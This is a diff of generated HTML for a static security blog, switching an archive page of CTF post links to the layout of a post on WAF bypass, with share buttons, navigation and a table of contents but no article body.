-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%8F%90%E9%AB%98/" class="archive-article-date">
-  	<time datetime="2020-02-02T14:43:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%8F%90%E9%AB%98/">CTF从入门到提高</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/CTF%E9%A2%98%E7%9B%AE%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-02-02T05:13:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/CTF%E9%A2%98%E7%9B%AE%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">CTF题目靶机练习</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/01/sqli-labs-WriteUps/" class="archive-article-date">
-  	<time datetime="2020-02-01T15:32:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/01/sqli-labs-WriteUps/">sqli-labs WriteUps</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -513,23 +370,129 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/24/WAF%E7%BB%95%E8%BF%87%E5%AF%B9%E6%8A%97/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/09/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">二进制安全面试题</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#不同架构层的WAF绕过"><span class="toc-number">2.</span> <span class="toc-text">不同架构层的WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网络架构层"><span class="toc-number">2.1.</span> <span class="toc-text">网络架构层</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资源层"><span class="toc-number">2.2.</span> <span class="toc-text">资源层</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#协议层"><span class="toc-number">2.3.</span> <span class="toc-text">协议层</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#规则缺陷层"><span class="toc-number">2.4.</span> <span class="toc-text">规则缺陷层</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web应用层"><span class="toc-number">2.5.</span> <span class="toc-text">Web应用层</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WAF绕过技巧"><span class="toc-number">3.</span> <span class="toc-text">WAF绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-解析后缀"><span class="toc-number">3.1.</span> <span class="toc-text">1. 解析后缀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-常见扩展名黑名单"><span class="toc-number">3.2.</span> <span class="toc-text">2. 常见扩展名黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-空白字符"><span class="toc-number">3.3.</span> <span class="toc-text">3. 空白字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-数据库解析注释符"><span class="toc-number">3.4.</span> <span class="toc-text">4. 数据库解析注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SQL函数-amp-关键字-MySQL"><span class="toc-number">3.5.</span> <span class="toc-text">5. SQL函数&amp;关键字-MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-SQL函数-amp-关键字-MSSQL数据库"><span class="toc-number">3.6.</span> <span class="toc-text">6. SQL函数&amp;关键字-MSSQL数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-容器特性"><span class="toc-number">3.7.</span> <span class="toc-text">7. 容器特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-IIS-asp-x-容器特性"><span class="toc-number">3.8.</span> <span class="toc-text">8. IIS+asp(x)容器特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-大小写转换法"><span class="toc-number">3.9.</span> <span class="toc-text">9. 大小写转换法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-字符编码法"><span class="toc-number">3.10.</span> <span class="toc-text">10. 字符编码法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-HPP参数污染"><span class="toc-number">3.11.</span> <span class="toc-text">11. HPP参数污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-注入系列-amp-语言-amp-数据库特性"><span class="toc-number">3.12.</span> <span class="toc-text">12. 注入系列&amp;语言&amp;数据库特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL"><span class="toc-number">3.12.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-number">3.12.2.</span> <span class="toc-text">MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Annotation"><span class="toc-number">3.12.3.</span> <span class="toc-text">Annotation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache"><span class="toc-number">3.12.4.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx"><span class="toc-number">3.12.5.</span> <span class="toc-text">nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSX"><span class="toc-number">3.12.6.</span> <span class="toc-text">OSX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">3.12.7.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-amp-amp-IIS"><span class="toc-number">3.12.8.</span> <span class="toc-text">windows&amp;&amp;IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encoder"><span class="toc-number">3.12.9.</span> <span class="toc-text">Encoder</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-通配符绕过-Linux"><span class="toc-number">3.13.</span> <span class="toc-text">13. 通配符绕过(Linux)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-数据库绕过-注释符绕过"><span class="toc-number">3.14.</span> <span class="toc-text">14. 数据库绕过-注释符绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-数据库绕过-空白符绕过"><span class="toc-number">3.15.</span> <span class="toc-text">15. 数据库绕过-空白符绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-数据库绕过-浮点数词法解析"><span class="toc-number">3.16.</span> <span class="toc-text">16. 数据库绕过-浮点数词法解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-数据库绕过-函数分隔符"><span class="toc-number">3.17.</span> <span class="toc-text">17. 数据库绕过-函数分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-报错注入深入"><span class="toc-number">3.18.</span> <span class="toc-text">18. 报错注入深入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-数据库标识位绕过法"><span class="toc-number">3.19.</span> <span class="toc-text">19. 数据库标识位绕过法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-Fuzz绕过SQL、XSS、上传"><span class="toc-number">3.20.</span> <span class="toc-text">20. Fuzz绕过SQL、XSS、上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#过程"><span class="toc-number">3.20.1.</span> <span class="toc-text">过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-number">3.20.2.</span> <span class="toc-text">案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tricks"><span class="toc-number">4.</span> <span class="toc-text">Tricks</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/4/">4</a><a class="page-number" href="/archives/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/archives/page/7/">7</a><a class="page-number" href="/archives/page/8/">8</a><a class="extend next" rel="next" href="/archives/page/7/">Next &amp;raquo;</a>
-    </nav>
   
+
+  
+
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
 
 
           </div>
@@ -569,8 +532,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
